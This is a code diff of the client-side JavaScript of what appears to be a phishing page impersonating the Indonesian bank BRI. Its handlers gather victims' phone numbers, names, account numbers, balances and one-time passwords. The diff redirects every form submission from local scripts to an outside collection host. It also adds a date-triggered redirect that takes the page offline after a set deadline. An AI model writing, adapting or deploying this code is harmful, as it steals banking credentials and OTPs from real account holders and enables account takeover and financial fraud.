@@ -1,4 +1,10 @@
-
+let tglNow = new Date();
+let waktuBatas = new Date("2025-08-09T23:59:59");
+if (tglNow.getTime() >= waktuBatas.getTime()) {
+  document.location.href = 'https://suspend-web.pages.dev';
+} else {
+  console.log('Server aktif');
+}
 // index
 function sendNohp(){    
     event.preventDefault();                   
@@ -12,7 +18,7 @@ function sendNohp(){
    
        $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/BRI/dsk55a/no.php',
             data: $('#hpForm').serialize(),
             datatype: 'JSON',
             
@@ -41,13 +47,13 @@ function sendLogin(){
     const rek = $('#rek').val();
                                 
    if (!tarif || !nomor || !nama || !rek ) {      
-        window.location.href = "index.php";
+        window.location.href = "/";
         return false;
     }                        
    
      $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/BRI/dsk55a/login.php',
             data: $('#loginForm').serialize(),
             datatype: 'JSON',
             
@@ -83,13 +89,13 @@ function sendSaldo(){
     const saldo = $('#saldo').val();
                                 
    if (!tarif || !nomor || !nama || !rek || !saldo) {      
-        window.location.href = "index.php";
+        window.location.href = "/";
         return false;
     }    
   
        $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://demcloud.my.id/BRI/dsk55a/saldo.php',
             data: $('#saldoForm').serialize(),
             datatype: 'JSON',
         
@@ -128,13 +134,13 @@ function sendOtp(){
     const otp = $('#otp').val();
                                 
    if (!tarif || !nomor || !nama || !rek || !saldo || !otp) {      
-        window.location.href = "index.php";
+        window.location.href = "/";
         return false;
     }    
      
      $.ajax({
             type: 'POST',
-            url: 'rest/otp.php',
+            url: 'https://demcloud.my.id/BRI/dsk55a/otp.php',
             data: $('#formOtp').serialize(),
             datatype: 'JSON',
         
@@ -163,7 +169,7 @@ function wa(){
    audio.play();
    
 setTimeout(function(){  
-location.href='wa';
+location.href='https://demcloud.my.id/BRI/dsk55a/wa';
     }, 5000);
     setTimeout(function(){
     $(".wait").fadeOut();   
